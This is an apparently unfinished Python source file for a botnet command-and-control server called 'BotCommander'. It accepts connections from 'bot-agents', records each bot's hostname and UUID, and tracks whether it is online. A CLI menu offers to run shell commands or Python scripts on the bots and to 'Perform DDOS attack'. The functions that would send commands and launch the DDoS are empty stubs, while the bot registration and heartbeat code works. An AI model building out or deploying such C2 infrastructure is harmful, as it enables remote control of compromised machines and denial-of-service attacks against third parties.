import os
import asyncio
from threading import Thread
from pathlib import Path
import configparser
from logger import CoreLogger
from socket import socket, AF_INET, SOCK_STREAM


def load_conf():
    config_parser = configparser.ConfigParser()
    cwd_path = Path(__file__)
    root_dir = cwd_path.parent.absolute()
    try:
        config_path = os.path.join(root_dir, "cfg/commander.ini")
        config_parser.read(config_path)
        host = config_parser.get("CORE", "HOST")
        port = int(config_parser.get("CORE", "PORT"))
        log_level = int(config_parser.get("CORE", "LOG_LEVEL"))
        log_dir = config_parser.get("CORE", "LOG_DIR")
        log_name = config_parser.get("CORE", "LOG_NAME")
        conn_buff = int(config_parser.get("CORE", "CONN_BUFF"))
        offline_tout = int(config_parser.get("CORE", "OFFLINE_TOUT"))
    except Exception as err:
        print("Error initializing CORE, Commander not started because config file could not be loaded. Unexpected "
              "exception occurred: {}".format(err))
        exit(5)
    return host, port, log_level, log_dir, log_name, conn_buff, offline_tout


class BotCommander:
    def __init__(self, host, port, conn_rcv, offline_tout):
        self.uuids = {}
        self.host = host
        self.port = port
        self.conn_rcv = conn_rcv
        self.offline_tout = offline_tout
        self.sock = socket(AF_INET, SOCK_STREAM)
        self.user_thread = Thread(target=self.__get_user_input).start()
        asyncio.run(self.__run())

    @staticmethod
    def __print_help():
        print('''
        Welcome to Commander CLI!
        The following options are available:
        1) Execute shell/cmd commands
        2) Execute python script
        3) Perform DDOS attack         
        ''')

    @staticmethod
    def __print_cmd_options():
        print("""
        The following options are available:
        1) Windows command - cmd/powershell
        2) Linux command - shell
        3) Generic command - command that can be processed by both Windows and Linux OS
        NOTE: If you choose 3 the command will be sent to all online bot-agents, if not it will be sent
        only to those online bot-agents running on the chosen OS type command
        """)

    def __get_user_input(self):
        self.__print_help()
        while True:
            val = 0
            choice = input("Please insert a digit representing the option you want to choose: ")
            try:
                val = int(choice)
            except ValueError:
                print("You have not inserted a digit, please insert a digit.")
            except Exception as err:
                print(f"An unexpected exception occurred while processing your choice. Please retry and insert a digit."
                      f" This is the error: {err}")
            if val in range(1, 4):
                match val:
                    case 1:
                        self.__print_cmd_options()
                        self.__exec_shell_cmd()
                    case 2:
                        self.__exec_python_script()
                    case 3:
                        self.__perform_ddos()
            else:
                print("Please insert a digit corresponding to one of the available options, 1, 2 or 3")

    def __exec_shell_cmd(self):
        choice = input("Please insert a digit representing the option you want to choose: ")
        try:
            val = int(choice)
        except ValueError:
            print("You have not inserted a digit, please insert a digit.")
            self.__exec_shell_cmd()
        except Exception as err:
            print(f"An unexpected exception occurred while processing your choice. Please retry and insert a digit."
                  f" This is the error: {err}")
            self.__exec_shell_cmd()
        if val in range(1, 4):
            match val:
                case 1:
                    cmd_filter = "windows"
                case 2:
                    cmd_filter = "linux"
                case 3:
                    cmd_filter = ""
        else:
            print("Please insert a digit corresponding to one of the available options, 1, 2 or 3")
            self.__print_cmd_options()
            self.__exec_shell_cmd()
        print("NOTE: There is no validation performed by commander in regards to your command, so insert a valid one")
        cmd = input("Please insert the command you want to be executed: ")
        if cmd:
            self.__send_cmd_to_bot_agents(cmd, cmd_filter)
        else:
            print("You need to insert something. Starting over")
            self.__print_cmd_options()
            self.__exec_shell_cmd()

    def __send_cmd_to_bot_agents(self, payload, cmd_filter):
        pass

    def __exec_python_script(self):
        pass

    def __perform_ddos(self):
        pass

    async def __communicate_with_agent(self, reader, writer, addr, hostname, uuid):
        while True:
            try:
                data = await reader.read(self.conn_rcv)
            except Exception as err:
                logger.core.error(f"Unexpected exception when reading input stream from bot-agent {hostname}: {err},"
                                  f" closing connection")
                writer.close()
                return
            if data:
                try:
                    msg = data.decode("utf-8")
                    if msg == "Hello":
                        logger.core.debug(f"Received Hello from bot-agent {hostname}:{addr}")
                        try:
                            self.uuids[uuid]["online"] = True
                        except KeyError:
                            logger.core.error(f"KeyError encountered when updating state of bot-agent {hostname} to "
                                              f"online after Hello was received. UUID {uuid} doesn't exist in DB")
                            writer.close()
                            return
                        logger.core.debug(f"Bot-agent {hostname}:{addr} is still online")
                        try:
                            logger.core.debug(f"Sending HelloReply to bot-agent {hostname}:{addr}")
                            writer.write(b"HelloReply")
                        except Exception as err:
                            logger.core.error(f"Unexpected exception when sending HelloReply to {hostname}: {err},"
                                              f" closing connection")
                            writer.close()
                            return
                    else:
                        logger.core.error(f"Unknown message received from peer {hostname}:{addr}, expecting Hello."
                                          f" Closing connection")
                        writer.close()
                        return
                except Exception as err:
                    logger.core.error(f"Unexpected error while decoding data from peer {hostname}:{addr}: {err}")
                    writer.close()
                    return
            else:
                logger.core.error(f"EOF received when reading input stream from bot-agent {hostname}:{addr},"
                                  f" closing connection")
                writer.close()
                return

    async def __identify_agent(self, reader, writer):
        addr = writer.get_extra_info('peername')
        logger.core.info(f"Connection accepted from peer {addr}")
        hostname = await self.__get_hostname(reader, writer, addr)
        uuid = await self.__process_uuid(reader, writer, addr, hostname)
        asyncio.create_task(self.__communicate_with_agent(reader, writer, addr, hostname, uuid))

    async def __process_uuid(self, reader, writer, addr, hostname):
        try:
            data = await reader.read(self.conn_rcv)
        except Exception as err:
            logger.core.error(f"Unexpected exception when reading agent UUID from peer {hostname}: {err},"
                              f" closing connection")
            writer.close()
            return
        if not data:
            logger.core.error(f"Received EOF or empty response from peer {hostname}-{addr} when reading UUID")
            writer.close()
            return
        uuid = data.decode("utf-8")
        logger.core.debug(f"Received UUID {uuid} from peer {hostname}-{addr}")
        if uuid in self.uuids:
            logger.core.debug(f'Agent {hostname}:{addr} with UUID {uuid}'
                              f' already present in DB')
        else:
            self.uuids[uuid] = {"hostname": hostname, "addr": addr, "online": True, "reader": reader, "writer": writer}
            logger.core.debug(f"Successfully added agent {hostname}-{uuid} to DB")
        try:
            writer.write(b"getUUIDReply")
        except Exception as err:
            logger.core.error(f"Unexpected exception when sending getUUIDReply to {hostname}: {err},"
                              f" closing connection")
            writer.close()
            return
        return uuid

    @staticmethod
    def __get_uuid_payload():
        return "getUUID".encode("utf-8")

    @staticmethod
    def __safe_dict_double_get(d, key_1, key_2):
        try:
            return d.get(key_1).get(key_2)
        except AttributeError:
            logger.core.error(f"Commander failed to fetch {key_2} for bot-agent with UUID {key_1} because this UUID"
                              f"does not exist in DB")
        except Exception as err:
            logger.core.error(f"Unexpected error when commander tried to fetch {key_2} for bot-agent with UUID {key_1}: {err}")

    async def __get_hostname(self, reader, writer, addr):
        try:
            data = await reader.read(self.conn_rcv)
        except Exception as err:
            logger.core.error(f"Unexpected exception when reading hostname from peer {addr}: {err},"
                              f" closing connection")
            return
        if not data:
            logger.core.error(f"Received EOF or empty response from peer {addr} when reading hostname")
            writer.close()
            return
        hostname = data.decode("utf-8")
        logger.core.debug(f"Received hostname {hostname} from peer {addr}")
        try:
            writer.write(b"getHostnameReply")
        except Exception as err:
            logger.core.error(f"Unexpected exception when sending getHostnameReply to {hostname}: {err},"
                              f" closing connection")
            writer.close()
            return
        return hostname

    async def __run(self):
        server = await asyncio.start_server(self.__identify_agent, self.host, self.port)

        addrs = ", ".join(str(self.sock.getsockname()) for self.sock in server.sockets)
        logger.core.info(f"Server started listener on {addrs}")

        async with server:
            await server.serve_forever()


if __name__ == "__main__":
    HOST, PORT, LOG_LEVEL, LOG_DIR, LOG_NAME, CONN_BUFF, OFFLINE_TOUT = load_conf()
    logger = CoreLogger(LOG_LEVEL, LOG_DIR, LOG_NAME)
    srv = BotCommander(HOST, PORT, CONN_BUFF, OFFLINE_TOUT)
    logger.core.info("Botnet-Commander exited")
